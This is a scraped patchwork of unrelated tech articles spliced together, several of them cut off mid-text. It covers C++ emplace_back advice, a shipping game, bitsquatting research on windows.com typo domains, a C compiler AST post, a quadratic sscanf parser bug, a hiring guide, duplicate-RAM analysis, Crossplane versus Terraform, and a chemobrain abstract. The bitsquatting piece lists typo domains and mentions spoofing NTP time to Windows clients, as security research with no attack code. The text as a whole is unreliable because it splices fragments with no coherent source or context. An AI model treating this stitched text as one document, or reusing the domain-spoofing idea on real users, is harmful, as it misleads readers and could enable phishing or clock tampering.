<blockquote>
  <p>Use <code>push_back</code> by default.</p>
</blockquote>

<blockquote>
  <p>Use <code>emplace_back</code> where it is semantically significant to your algorithm
(such as when the element type’s move-constructor is absent or has been
benchmarked as expensive).</p>
</blockquote>

<blockquote>
  <p>Avoid mixing string literals and perfect-forwarding templates,
especially in repetitive machine-generated code.</p>
</blockquote>

                exchange for a share of the revenue.</p>
            <p>Unfortunately, this being 1721, a significant fraction of shipments
                end up on the sea floor, or stolen by pirates, or gets lost to
                corrupt locals.</p>
            <p>You will be presented with a few shipments to finance, of varying
                value, ordered from low to high. They all have the same return
                relative to financing cost – your job is just to pick the most
                attractively sized suggestion.</p>
            <p>All proposed shipments have one thing in common: they will need to
                pass through a specific strait. This is critical information for
                your decision: different straits have different probabilities of
                losing the goods.</p>

            <p>You will have to consider three straits. Their true probability of
                success is unknown (and varies whenever you restart the game) but
                you get an estimation for each as a hint.</p>
            <ul>
                <li><strong>Bering</strong>: Very dangerous. Probability of success
                    is around 50&nbsp;%. Shipments through Bering strait
                    often have a high payoff as a result.</li>
                <li><strong>Malacca</strong>: Somewhat unsafe. Probability of
                    success is estimated to be between 60&nbsp;% and 80&nbsp;%.</li>
                <li><strong>Gibraltar</strong>: Very safe. Probability of success
                    unknown, but it seems to be over 90&nbsp;%, maybe even as high
                    as 100&nbsp;%. These shipments have relatively low payoff.</li>
            </ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://remyhax.xyz/image/dns.jpg"></figure><p>Earlier this month, I came back around to seriously considering an attempt at <a href="http://dinaburg.org/bitsquatting.html">bitsquatting</a>. While the prior link goes into great depth on the topic, I will attempt to give a <em>very</em> high level overview here:</p><p>If this sort of thing interests you: I tend to do stuff like this weekly. Give me a follow <a href="https://twitter.com/_mattata">@_mattata</a></p><p>When you try to access a site by it’s domain, that domain is stored in the memory of your computer, device, whatever… in a structure that looks something like this.</p><table><thead><tr><th>01110111</th><th>01101001</th><th>01101110</th><th>01100100</th><th>01101111</th><th>01110111</th><th>01110011</th></tr></thead><tbody><tr><td>w</td><td>i</td><td>n</td><td>d</td><td>o</td><td>w</td><td>s</td></tr></tbody></table><p>Now let’s say that the computer is running too hot, a solar flare is happening, or a cosmic ray (very real thing) flips a bit on the computer.</p><table><thead><tr><th>01110111</th><th>01101000</th><th>01101110</th><th>01100100</th><th>01101111</th><th>01110111</th><th>01110011</th></tr></thead><tbody><tr><td>w</td><td><strong>h</strong></td><td>n</td><td>d</td><td>o</td><td>w</td><td>s</td></tr></tbody></table><p>Oh no! Now the value stored in memory is w<strong>h</strong>ndows.com instead of windows.com! When the time comes to make a connection to that domain, what happens?</p><blockquote><p>nslookup whndows.com</p></blockquote><blockquote><p>*** can’t find whndows.com: Non-existent domain</p></blockquote><p>The domain doesn’t resolve to an IP!</p><hr><p>In fact, out of the 32 valid domain names that are 1-bitflip away from windows.com 14 were available for purchase! This is a rather odd occurance as usually these are bought up by a company like Microsoft to prevent their use for phishing attempts. So I bought them. All of them. For ~$126.</p><p>(<em>If you’re a verifiably responsible party, I’m more than happy to transfer ownership of the domains. Otherwise, I’ll just hold on to them and continue to sinkhole.</em>)</p><blockquote><p>windnws.com
windo7s.com
windkws.com
windmws.com
winlows.com
windgws.com
wildows.com
wintows.com
wijdows.com
wiodows.com
wifdows.com
whndows.com
wkndows.com
wmndows.com</p></blockquote><p>Now we need to point these domains somewhere. So I rent a VPS and configure IPv4/IPv6, and create wildcard DNS entries to point to them.</p><p>Wildcard DNS works so that if I create a record saying that whndows.com points to 123.123.123.123 and someone requests abs.xyz.whndows.com, they will still get the same 123.123.123.123 DNS record as a reply. Due to the nature of this research dealing with bits being flipped, this allows me to capture any DNS lookup for a subdomain of windows.com where multiple bits have flipped.</p><p>Once we have DNS configured, we use <a href="https://www.wireshark.org/docs/man-pages/tshark.html">tshark</a> to perform a packet capture on the public interface of our VPS and wait for something interesting to happen.</p><p>Below is a short snippet of some interesting things that can be shared without uniquely indentifying any users.</p><p>Usage of <strong><a href="https://greynoise.io/tech">GreyNoise.io</a></strong> was key in helping to differentiate between opportunistic scanning and actual bitflip scenarios. Great product!</p><h2 id="ntp-udp-port-123-timewindowscom">NTP UDP port 123 time.windows.com</h2><p>UDP packets destined for port 123 attempting to set their computer clock using the Network Time Protocol (NTP).
time.windows.com is the default NTP server configured for all Windows machines and they check for the time regularly. If they don’t succeed in getting the time, they try again, and again, and again.</p><p>In total, over the course of 14 days, my server recieved <strong>199,180 NTP Client connections from 626 unique IP addresses.</strong></p><p>The NTP client for windows OS has no inherent verification of authenticity, so there is nothing stopping a malicious person from telling all these computers that it’s after <a href="https://en.wikipedia.org/wiki/Year_2038_problem">03:14:07 on Tuesday, 19 January 2038</a> and wreaking unknown havoc as the memory storing the signed 32-bit integer for time overflows.</p><p>As it turns out though, for ~30% of these computers doing that would make little to no difference at all to those users because their clock is already <em>broken</em>.</p><p>Using the tshark filter “ntp.xmt” we can extract the Transmit Timestamp, which is the time that the computer thinks it is when it asks to update the time.</p><blockquote><p>tshark -r capture.pcap -T fields -e ntp.xmt -2 -R ntp.xmt | sort -u</p></blockquote><pre><code>Sep 28, 1984 19:41:12.638290998 EDT

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>Given that the Psyche-C compiler frontend is being renewed, I decided to start a blog about the project. This is my first post.</p>

<p>Without further ado, consider this C program (assume that its name is <code>test.c</code>):</p>

<div><div><pre><code><span>int</span> <span>v</span><span>,</span> <span>f</span><span>(</span><span>int</span> <span>d</span><span>);</span>

<span>int</span> <span>f</span><span>(</span><span>int</span> <span>p</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>p</span> <span>==</span> <span>v</span><span>)</span>
        <span>return</span><span>(</span><span>p</span> <span>-</span> <span>1</span><span>);</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>To produce and dump an AST with Psyche-C, we invoke the <em>cnippet</em> driver adaptor with command line option <code>--C-dump-AST</code>. The output is as follows:</p>

<p><img width="609" alt="Screen Shot 2021-03-03 at 20 56 16" src="https://user-images.githubusercontent.com/2905588/109888794-e8d75f00-7c62-11eb-98bc-c62247df0c3e.png"></p>

<p>Now, I’ll briefly correlate the above AST with the one produced by <a href="https://clang.llvm.org/">Clang</a> for the same <code>test.c</code> program. Let’s take a look at it:</p>

<p><img width="789" alt="Screen Shot 2021-03-03 at 21 03 44" src="https://user-images.githubusercontent.com/2905588/109889407-17096e80-7c64-11eb-9ecd-b0bd56af902e.png"></p>

<p>Apart from the colors and extra decoration, what are the main differences between the two?</p>

<ul>
  <li><em>It’s that Psyche-C’s AST is a bit closer to the grammar of C.</em> For instance, you can’t see <em>declarator</em>s in Clang’s AST, they are absorbed by their containing <em>declaration</em>s.</li>
</ul>

<p>Whether or not this characteristic is good or bad will depend on a given application. For the purpose of static analysis implementation, I consider the refined syntax insights of Psyche-C’s AST an advantage.</p>

<p>I’m not saying that every <em>node</em> in a AST should correspond to a <em>terminal</em> of the grammar. If so, we’d end up with a rather <strong>concrete</strong> syntax (or parse) tree, instead of an <strong>abstract</strong> syntax tree. A comprehensible AST will contain just enough of a language’s meaning embedded into it. (The AST produced by the <a href="https://github.com/ltcmelo/psychec/tree/original">old parser of Psyche-C</a>, e.g., was too grammar-oriented.)</p>

<p>Consider this snippet from our <code>test.c</code> program:</p>



<p>In Clang’s AST, it’s represented through a <code>VarDecl</code> and a <code>FunctionDecl</code>; both these nodes <a href="https://clang.llvm.org/doxygen/classclang_1_1DeclaratorDecl.html">inherit from</a> <code>DeclaratorDecl</code> (i.e., a <em>declaration</em> with a <em>declarator</em>). But, in pedantic terms, that representation isn’t quite correct, given that a single <em>declaration</em> — one starting at <code>int</code> and ending at <code>;</code> — exists in that snippet.</p>

<p>In Psyche-C, I opted for a more rigorous representation in the AST:</p>

<ul>
  <li>A <code>VariableAndOrFunctionDeclaration</code> is created (just like Clang, this node <a href="https://ltcmelo.github.io/psychec/api-docs/html/classpsy_1_1_c_1_1_variable_and_or_function_declaration_syntax.html">inherits from</a> a <code>DeclaratorDeclaration</code>) with two child nodes: an <code>IdentifierDeclarator</code>, designating object of type <code>int</code>, and a <code>FunctionDeclarator</code>, designating a function whose return type is <code>int</code>. This choice makes the AST rewritable with accuracy as well.</li>
</ul>

<p>In general, the design “spirit” of Psyche-C’s AST is more aligned with that of <a href="https://github.com/dotnet/roslyn">Roslyn</a>, the .NET compiler platform. Although, because Psyche-C is a frontend for C, its AST will, of course, resembles that of Clang.</p>

<p>To wrap up, I’ll leave a C# version of <code>test.c</code> (well, <code>test.cs</code>), together with its AST.</p>

<h2>It Can Happen to You</h2>
<p>A few days ago, a <a href="https://nee.lv/2021/02/28/How-I-cut-GTA-Online-loading-times-by-70/">fascinating article</a>
about Grand Theft Auto Online
made the rounds of the tech news ecosystem.</p>
<p>I'd encourage you to read the whole thing, but in short,
GTA Online had <a href="https://accidentallyquadratic.tumblr.com/">accidentally quadratic</a>
performance when parsing a large JSON blob
(due to repeated calls to <code>strlen</code>);
fixing this improved loading time by almost 70%.</p>
<p>This sparked a <a href="https://news.ycombinator.com/item?id=26296339">great deal</a> of discussion:
Was this C's fault?
Perhaps <a href="https://twitter.com/Jonathan_Blow/status/1366452792563359744">"web shit"</a>?
<a href="https://twitter.com/fasterthanlime/status/1366187333507293184">Capitalism and incentives</a>?</p>
<p>Still, folks in the comments section generally agreed:
<em>they</em> wouldn't write anything that silly.</p>
<p>(<em>do you feel the foreshadowing?</em>)</p>
<hr>
<p>One of my side projects is a high-performance 3D viewer named <a href="https://www.mattkeeter.com/projects/erizo">Erizo</a>.</p>
<p><img src="https://www.mattkeeter.com/blog/2021-03-01-happen/porsche.png" alt="Porsche"></p>
<p>Thanks to a lot of careful programming, it will open a 97 MB binary STL
file in about 165 milliseconds flat, on a <em>2013</em> Macbook Pro.
This is <strong>blinding</strong> fast.</p>
<p>In the interest of compatibility, I wrote a small parser for
<a href="https://en.wikipedia.org/wiki/STL_(file_format)#ASCII_STL">ASCII STLs</a> as well.</p>
<p>ASCII STLs are a poorly-specified plain-text format that looks like this:</p>
<pre><code>solid cube_corner
          facet normal 0.0 -1.0 0.0
            outer loop
              vertex 0.0 0.0 0.0
              vertex 1.0 0.0 0.0
              vertex 0.0 0.0 1.0
            endloop
          endfacet
          facet normal 0.0 0.0 -1.0
            outer loop
              vertex 0.0 0.0 0.0
              vertex 0.0 1.0 0.0
              vertex 1.0 0.0 0.0
            endloop
          endfacet
          ...
endsolid
</code></pre>
<p>I wrote an extremely <a href="https://en.wikipedia.org/wiki/Robustness_principle">robust</a>
parser, described in a comment as</p>
<pre><code>/*  The most liberal ASCII STL parser:  Ignore everything except
 *  the word 'vertex', then read three floats after each one. */
</code></pre>
<p>Loading ASCII STLs always seemed a little slow, but I assumed
that's what you get for using an inefficient textual format.</p>
<p>(<em>foreshadowing intensifies</em>)</p>
<hr>
<p>Over the course of a few days, several things happened:</p>
<ul>
<li>I revisited Erizo for the first time in a few years to fix a <a href="https://github.com/mkeeter/erizo/commit/d4683f94a4aa0b674bdde0fa53fb6f92d6e1979c">focus issue on macOS</a></li>
<li>The GTA Online article was published</li>
<li>In a follow-up discussion, I learned that
<a href="https://news.ycombinator.com/item?id=26302744">parsing could be quadratic due to repeated calls to <code>sscanf</code></a></li>
<li>I noticed that ASCII STL loading was <em>really quite</em> slow.</li>
</ul>
<p>Here's the timestamped logs (in seconds), loading a 1.5 MB ASCII STL:</p>
<pre><code>[erizo] (0.000000) main.c:10      | Startup!
[erizo] (0.162895) window.c:91    | Created window
[erizo] (0.162900) window.c:95    | Made context current

[erizo] (1.819887) loader.c:279   | Loader thread done
[erizo] (1.821291) instance.c:32  | Showed window
</code></pre>
<p>From startup to showing the window, it took over 1.8 seconds!</p>
<p>Looking at the ASCII parser with fresh eyes, the cause was glaringly obvious:</p>
<pre><code>    /*  The most liberal ASCII STL parser:  Ignore everything except
     *  the word 'vertex', then read three floats after each one. */
    const char VERTEX_STR[] = "vertex ";
    while (1) {
        data = strstr(data, VERTEX_STR);
        if (!data) {
            break;
        }

        /* Skip to the first character after 'vertex' */
        data += strlen(VERTEX_STR);

        for (unsigned i=0; i &lt; 3; ++i) {
            SKIP_WHILE(isspace);
            float f;
            const int r = sscanf(data, "%f", &amp;f);
            ABORT_IF(r == 0 || r == EOF, "Failed to parse float");
            if (buf_size == buf_count) {
                buf_size *= 2;
                buffer = (float*)realloc(buffer, buf_size * sizeof(float));
            }
            buffer[buf_count++] = f;

            SKIP_WHILE(!isspace);
        }
    }
</code></pre>
<p>You may notice <code>sscanf</code>, happily sitting there, reading a single float off
the front of the data stream and <strong>checking the length of the whole string each time</strong>.</p>
<p>Yes, I had made the exact same mistake as the programmers working on GTA Online:
I had an accidentally quadratic parser!</p>
<p>Replacing the <code>sscanf</code> call with <code>strtof</code> improved startup by nearly a factor of
10: from 1.8 seconds to 199 milliseconds.</p>
<pre><code>[erizo] (0.000000) main.c:10      | Startup!
[erizo] (0.178082) window.c:91    | Created window
[erizo] (0.178086) window.c:95    | Made context current

</code></pre>
<p>This is back down in the noise of
"how long does the OS take to give us an OpenGL context",
which is a great place for a high-performance tool.</p>
<hr>
<p>As someone that has been programming for many years,
this was a perfectly-timed reminder that there are <em>always</em> pitfalls out there.
The <a href="https://en.cppreference.com/mwiki/index.php?title=cpp/io/c/fscanf&amp;oldid=125683">documentation for <code>sscanf</code></a>
does not include a time complexity,
so this is particularly tricky <a href="https://en.wiktionary.org/wiki/footgun">footgun</a>,
and I'm sure it's not the only one lurking in the darkness.</p>
<p>You may not get such a perfectly-timed reminder, but it's worth remembering –
next time you read a fascinating story about bad programming –
that it <em>can</em> happen to you!</p>
<p>(Obviously, the moral of the story is to not use <code>sscanf</code> to repeatedly
parse single tokens off the front of a string; I'm sure you'll do <em>fine</em>
if you can just avoid <strong>that</strong>)</p>

<p>A hacker of unknown origins hacked into servers of Complify, a rapidly growing VC-funded startup. When Complify's security specialists noticed the breach, it was too late. However, unexpectedly, the hacker's actions did not seem to have been destructive in nature.</p><p>Apparently, the hacker rewrote complex backend architecture with a simple, single-node PostgreSQL instance and a bunch of cron jobs. This made the whole cluster of orchestrated containerized systems obsolete in one night. As a result, the CEO and the board of directors had no other choice but to let go 583 tech employees (nearly 40% of the workforce), as they now have literally nothing to do.</p><p>Alarmed, other startups in the industry are hiring more security specialists in order to reduce the risk of so-called <strong>"green-hat hacker"</strong> attacks.</p>

    <h2>A Terse Guide on Hiring Your First Engineering Manager</h2>
  </div><div>
    <p>Hiring an early-stage manager can bring up powerful fears of making a bad hire.</p>

<ul>
  <li>What if they ruin our culture?</li>
  <li>What if we lose good people because of them?</li>
  <li>What if they cause harm?</li>
</ul>

<!--more-->

<p>This mindset can lead to fear-driven-development of the job description. The “what-ifs” turn into a laundry list of requirements without much coherence between them, and this leads to stressful hiring experience both for the candidate (who feels like they need to be superhero to succeed) and for the folks doing the hiring (who feel like they might never find the right person.)</p>

<h2 id="what-makes-a-manager">What Makes A Manager?</h2>

<p>When it comes to defining a manager’s role, I encourage people to start with a simple baseline: Look for someone who is effective at <em>performance management.</em></p>

<p>That term might make you cringe depending on your experience. However, <a href="https://www.alancolquitt.com/book">modern performance management</a> is quite a bit different than the discipline that spawned the term decades ago.</p>

<p>This is a whole topic in its own right, but for our purposes, let’s define performance management as “bringing people and resources together to make the right things happen.” It’s simple, but it’s hard!</p>

<p><em>TL;DR The baseline for an effective manager is that they can lead their teams in getting from “why” to “what” to “how”</em>.</p>

<p>An effective performance manager has competency in three areas:</p>

<h3 id="direction">Direction</h3>

<p>They understand and contribute to the company’s strategy at an appropriate level.</p>

<p>This means that they:</p>

<ul>
  <li>See it as their job to understand and represent what the business is doing (in their area, at least)</li>
  <li>Help their reports and peers to understand that direction for themselves</li>
</ul>

<p>Red flags can look like:</p>

<ul>
  <li>Seeing their job as “protecting” their team from “the business”</li>
  <li>Talking about “the business” like a foreign entity</li>
</ul>

<h3 id="alignment">Alignment</h3>

<p>They can lead their team from “why are we doing this?” to “what are we doing?”</p>

<p>This means that they:</p>

<ul>
  <li>Lead teams in designing solutions to problems</li>
  <li>Contribute well as peers with other disciplines (product management, design, etc.)</li>
  <li>Effectively guide people through conflict as it arises</li>
</ul>

<p>Red flags can look like:</p>

<ul>
  <li>Viewing their teams as “order-takers” for product management / design / etc</li>
  <li>A need to control rather than influence (e.g. requiring direct reporting lines to any area where they need to get things done)</li>
</ul>

<h3 id="progress">Progress</h3>

<p>They get results. This means going from “what are we doing?” to “we’re doing it!”</p>

<p>More specifically, they:</p>

<ul>
  <li>Get the right things done</li>
  <li>Use simple, understandable measurements to know that the right things are getting done</li>
  <li>Continually grow and resource their team</li>
</ul>

<p>Red flags can look like:</p>

<ul>
  <li>Dogmatic belief in a particular project-management process</li>
  <li>Shying away from taking ownership of outcomes</li>
  <li>Can’t hold multiple priorities in balance with one another (e.g. treats people terribly to get results, or sacrifices results to treat people too gently)</li>
</ul>

<h2 id="how-do-i-use-this">How Do I Use This?</h2>

<p>Starting with this short list of capabilities, you can:</p>

<ul>
  <li>Add a couple of other things that are important to the job (e.g. technical skills)</li>
  <li>Use the list of capabilities you came up with to write the job description</li>
  <li>Build an interview to test for these things</li>
</ul>

<p>If you’re looking for more detail, <a href="https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/">I wrote a guide on hiring for jobs you don’t understand well</a> that should help you put it all together.</p>

<h2 id="frequently-asked-questions">Frequently Asked Questions</h2>

<h3 id="q-why-isnt-there-a-communication-section-isnt-that-an-important-skill-for-a-manager">Q: Why isn’t there a “Communication” section? Isn’t that an important skill for a manager?</h3>

<p>It is common to test for communication directly. However, I don’t think it’s specific enough.</p>

<p>Think for a moment: Have you worked with a manager who was great at communicating with other engineering teams, but struggled in group sessions with product management, design, marketing, or other roles?</p>

<p>How about someone who was great at storytelling, but who had a hard time communicating how to turn that idea into reality?</p>

<p>These are all different types of communication, but they happen in different contexts.</p>

<p>The person who does well with their teams but poorly with product and design may be more comfortable with <em>making progress</em> than with <em>creating alignment.</em> Our storyteller may be great at communicating <em>direction</em> but not so good with the rest.</p>

<p>None of these gaps are necessarily deal-breakers on their own, but they do paint a clearer picture of where manager’s strengths might lie, and this extra specificity might help you make a better hiring decision.</p>

<h3 id="q-this-directionalignmentprogress-stuff-sounds-a-bit-fluffy-arent-there-better-words-for-it">Q: This direction/alignment/progress stuff sounds a bit fluffy. Aren’t there better words for it?</h3>

<p>I tend not to use these directly with folks unless I’m explaining the underlying model. When talking about it with everyone else, you can use something like “Strategy”, “Focus”, “Execution”; or, even more simply, “Why”, “What”, and “How”.</p>

<h3 id="q-you-havent-spoken-about-leadership-at-all-arent-leadership-qualities-important-in-a-manager">Q: You haven’t spoken about leadership at all. Aren’t leadership qualities important in a manager?</h3>

<p>This is a big topic. In short, my experience is this: It takes a lot of experience and pain to become a strong leader. There are some really interesting, deeply-thought-out leadership programs out there (e.g. <a href="https://coactive.com/training/leadership-training/">Co-Active Leadership</a>) but even those will push their trainees into different forms of suffering to develop their character.</p>

<p>Performance management, however, is a pretty distinct set of skills that can be learned quickly with some dedication. I think it’s a lot more reasonable to find someone who has these skills (or who can develop them on the job) than to expect them to have a lot of difficult-to-acquire leadership qualities, especially for front-line managers who tend to be earlier in their careers.</p>

<h2 id="need-help">Need Help?</h2>

<p>I like talking about hiring. Ping me on <a href="https://twitter.com/mikedeb0">Twitter</a> or <a href="https://www.linkedin.com/in/michael-dibernardo-5b19189/">LinkedIn</a> if you’d like to chat.</p>

<p>How much RAM on your laptop is sitting unused?  How much is empty?  How much is redundant?</p>

<p>In an ideal OS, the answer is none.  All RAM contains data of running programs, or buffers or cache to help speed up things you’re about to do.</p>

<p>But what about reality?   A quick <a href="https://gist.github.com/Hello1024/4902ff3bdba32a219adb4caa3563c23a">bit of python</a> and
<a href="https://github.com/Hello1024/devmem-full-access">a kernel module</a> later, and I now know!</p>

<p>System: Ubuntu 20.10 laptop, with 16 Gigs of RAM, running Chrome with +20 tabs, playing a bit of music and running a few other apps (Freecad, Deluge, Sublime).  Pretty typical desktop workload.</p>

<h3 id="results">Results…</h3>

<p>Of my 15.7 Gigs of RAM…   2.05 Gigs are exact duplicates of other memory (1.1Gigs of that are zeros), and 13.6 Gigs are unique.</p>

<h3 id="how-frequent-are-the-duplicates">How frequent are the duplicates?</h3>

<p><img src="https://omattos.com/images/dupemem-freqplot.png" alt="Frequency plot"></p>

<h3 id="what-data-has-the-most-duplicates">What data has the most duplicates?</h3>

<p>The most common are all zeros, all <code>0xff</code>’s, all <code>0xcc</code>’s (used by some memory debuggers?), and various patterns that I suspect are freelists of various memory allocators.</p>

<h3 id="what-is-a-typical-duplicate">What is a typical duplicate?</h3>

<p>Lets take a look at the 4k page of RAM with hash 0372a15ebe749b18d397c9dffdc55d21.  There are 5 copies of it.  The actual data is:</p>

<div><div><pre><code>gBFACQAJYAUgBUAC2AF4AYwA...lots more base64...A;gdpr=1;dc_adk=4100875739;ord=r2qk1l;click=https%3A%2F%2Fclicktrack.pubmatic.com%2FAdServer%2FAdDisplayTrackerSer
</code></pre></div></div>

<p>So it’s a bit of a cookie.   Is it a good use of RAM to keep 5 copies?</p>

<h3 id="what-about-free-memory">What about free memory?</h3>

<p>This system claims:</p>
<div><div><pre><code># free
              total        used        free      shared  buff/cache   available
Mem:       16153824     5098156     5662776      893616     5392892     9826072
</code></pre></div></div>

<p>Most of those ‘free’ pages contain data from previous programs, and is counted in the above analysis.   Quite why we have so much free memory when we could be preloading potentially useful data is another question…</p>

<h3 id="conclusion">Conclusion</h3>

<p>My RAM has a lot of duplicate data in.  This seems counter to good design practices which should keep just one copy of big chunks of identical data.   Anyone fancy running the same code on their system, tracking down who is copying and allocating this data, and sending patches to the relevant projects to keep just one copy of this data and allow the RAM to be used for better things?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Crossplane is often compared to HashiCorp’s Terraform. It’s common for enterprise platform teams to find Crossplane as they outgrow Terraform and look for alternatives, so there are parallels between the two open source projects:</p><ul><li>Both allow engineers to model their infrastructure as declarative configuration</li><li>Both support managing a myriad of diverse infrastructure using "provider" plugins</li><li>Both are open source tools with strong communities</li></ul><p>The key difference is that Crossplane is a control plane, where Terraform is a command-line tool - an interface to control planes. This post touches on a handful of pain points that enterprises commonly face as they scale Terraform, and highlights how Crossplane addresses these&nbsp;issues.</p><h2 id="collaboration">Collaboration</h2><p>Enterprises often adopt Terraform via their operations team. It’s a great way for a small team of engineers to begin to wrangle their organisation’s infrastructure. Representing infrastructure as declarative configuration allows an operations team to benefit from software engineering best practices - keeping the configuration in revision control where changes can be peer reviewed and reverted when necessary.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Cone@0.25x.png"></figure><p>Where Terraform can fall apart is when more engineers need to collaborate to manage their organisation’s infrastructure. Terraform relies on a monolithic state file to map desired configuration to actual, running infrastructure. A lock must be held on this state file while configuration is being applied, and applying a Terraform configuration is a blocking process that can take minutes to complete. During this time no other entity - no other engineer - can apply changes to the configuration. Similarly, Terraform uses a monolithic ‘apply’ process - there’s no recommended way to modify only one piece of infrastructure within a configuration. If you use the same configuration to manage your caches and your databases you must always update both - you can’t update only your caches.</p><p>Terraform recommends breaking a monolithic configuration up into increasingly more granular configurations. So while the operations team might start with a Terraform configuration that represents ‘production’, they’re encouraged to factor that out into scoped configurations like ‘production billing’ and ‘production auth’. It’s hard to get this right up front, so it can require <em>a lot</em> of refactoring over time, and often results in a complex mesh of Terraform configurations coupled by their inputs and outputs.</p><p>Collaboration scales in Crossplane because the Crossplane Resource Model (XRM) promotes loose coupling and eventual consistency. In Crossplane every piece of infrastructure is an API endpoint that supports create, read, update, and delete operations. Crossplane does not need to calculate a graph of dependencies to make a change, so you can easily operate on a single database, even if you manage your entire production environment with Crossplane.</p><h2 id="self-service">Self Service</h2><p>Modern organisations are evolving from centralised management of infrastructure to a self service model in which an operations team - often called a platform team - defines opinionated infrastructure abstractions that the development teams they support can consume on demand. Terraform has evolved to support this model through the use of <em>modules</em>. A module is not unlike a software library. Like Crossplane, Terraform resources are high-fidelity representations of an external API resource. A module provides a simplified abstraction atop a broader configuration of these resources - for example <a href="https://registry.terraform.io/modules/terraform-aws-modules/rds/aws/latest">the RDS module</a> abstracts eight distinct Terraform resources into a single “RDS instance” concept.</p><p>Treating application teams as consumers of a “library” of Terraform configuration means they are subject to Terraform’s collaboration constraints. Application developers are invited to collaborate on their organisation’s infrastructure as if they were an operations team with a narrower focus. The platform team invites application development teams to share their workflow, rather than offering them a service. This means application teams must learn a new, special purpose toolset and language - Terraform and the HashiCorp Configuration Language (HCL). It also raises the level of <em>configuration abstraction</em> for application developers without raising the level of <em>access control abstraction</em>. While the platform team can publish a module that allows an application team to manage “RDS instances”, access control remains down at the cloud provider API level and is thus framed around “database subnet groups” and “database parameter groups”.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/MulticloudCrane@0.5x-2.png"></figure><p>The Crossplane equivalent of a Terraform module is a Composite Resource - an XR. Each XR is exposed as an API endpoint. A platform team can define and document the OpenAPI schema of each XR - each API - and enforce Role Based Access Control (RBAC) at the API level. This means that if a platform team decides to frame the abstraction they offer to their development teams as “an AcmeCo PostgreSQL database” they can grant RBAC access to create, read, update, or delete an AcmeCo PostgreSQL database, rather than having to manage access to various underlying cloud concepts like RDS instances or subnet groups. Because Crossplane builds on the battle hardened Kubernetes RBAC system a platform team can easily support many teams of application developers within a single control plane. Each team can be granted access only to the abstractions they need - some might be able to manage only storage buckets, while others may be allowed to manage caches and databases.</p><p>Self service scales even further in Crossplane because any one XR may offer several classes of service. Crossplane decouples an XR’s inputs and outputs - its spec and status in Kubernetes parlance - from its implementation, which is described by a Composition. If an application developer has been granted access to create AcmeCo PostgreSQL databases, they may easily select from any of the classes of service - any of the Compositions - their platform team has declared to be compatible with said databases. These classes of service could represent production, staging, and development; AWS, Azure, and GCP; fast and slow; or any combination thereof.</p><h2 id="integration-and-automation">Integration and Automation</h2><p>Terraform sits in front of many APIs, but it does not offer its own. This leads many teams automate it by committing their Terraform configuration(s) to revision control - git - and executing Terraform as part of their CI/CD pipeline. This is an improvement relative to a team running Terraform from their laptops, but it exposes a key issue that organisations face when attempting to scale their use of Terraform. Terraform is a command line tool - not a control plane. Because it is a short lived, one-shot process it will only attempt to reconcile your desired configuration with actual infrastructure when it is invoked. Whether run from a CI/CD pipeline or a laptop Terraform is typically invoked only when an engineer <em>expects</em> that infrastructure needs updating.</p><p>Terraform’s conservative, ‘on-demand’ approach to reconciling desired with actual infrastructure state can lead to a novel deadlock. Recall that the process of applying a Terraform configuration is all-or-nothing - if you describe your caches and your databases in the same configuration you must always update both to update either. This means that if anyone in your organisation circumvents Terraform the next person to trigger a Terraform run will be faced with a surprising plan as it attempts to undo the change. Consider for example a scenario in which an engineer is paged in the middle of the night to handle an incident, makes some quick edits to the production cache configuration via the AWS console, and forgets to reflect those changes in Terraform. It’s not unheard of for infrastructure to drift so much that applying a Terraform configuration becomes a risky, intimidating proposition.</p><p>Crossplane, on the other hand, is built as a series of long lived, always-on control loops. It constantly observes and corrects an organisation’s infrastructure to match its desired configuration whether changes are expected or not. This disincentivizes teams from circumventing Crossplane. When Crossplane has been asked to manage a piece of infrastructure any change made outside it will automatically and persistently be reverted.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Simple-Terraform-Stack.svg"></figure><p>A continued theme among the pain points organisations face with Terraform is that it does not offer an API. Integrating with Terraform is challenging because it is configured using a Domain Specific Language (DSL) - HCL - and invoked by calling a command line tool. Crossplane exposes a REST API - the lingua franca of automation. Whether a team writes mostly shell scripts, mostly Python, or mostly Erlang common patterns and libraries will exist for integrating with REST APIs and thus for integrating with Crossplane.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Simple-Crossplane-Stack.svg"></figure><p>Crossplane doesn’t expose any old REST API. Building on the Kubernetes API means that teams can orchestrate all of their infrastructure - cloud and otherwise - using tools like kubectl. The same tools they use to orchestrate their containerised applications. Crossplane can even expose the details an application needs to connect to infrastructure as a Kubernetes secret to ease integration. It can be paired with projects like ArgoCD, Gatekeeper, or Velero to enable GitOps, advanced policy, and backups. Need bespoke automation? Leverage one of many well documented frameworks to build your own Kubernetes operator that integrates with Crossplane.</p><h2 id="why-not-both">Why Not Both?</h2><p>Crossplane and Terraform can both orchestrate an organisation’s infrastructure. There are similarities between the two, but each project approaches orchestration differently. Terraform offers a command-line interface to control plane APIs, while Crossplane is <em>itself</em> a control plane that can be used to build abstractions atop other control planes. Because Crossplane enables a platform team to offer their own control plane it avoids many of the challenges platform teams face when scaling Terraform.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Simple-Crossplane-Stack-with-Terraform.svg"></figure><p>Savvy readers …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">                                   
                    <p>Nearly 3 out of 4 cancer patients undergoing chemotherapy suffer from loss of memory, attention or concentration. This range of cognitive deficiencies referred to as chemotherapy-induced cognitive impairment, chemobrain or chemofog severely hampers quality of life of patients undergoing treatment. Advanced neuroimaging analyses have identified structural white and gray matter damage following chemotherapy in patients treated for various types of cancer. Cognitive deficits associated with platinum-based therapeutics such as cisplatin have been observed for 5-10 years post-diagnosis. However, no United States Food and Drug Administration-approved therapeutic interventions are available to date.</p>

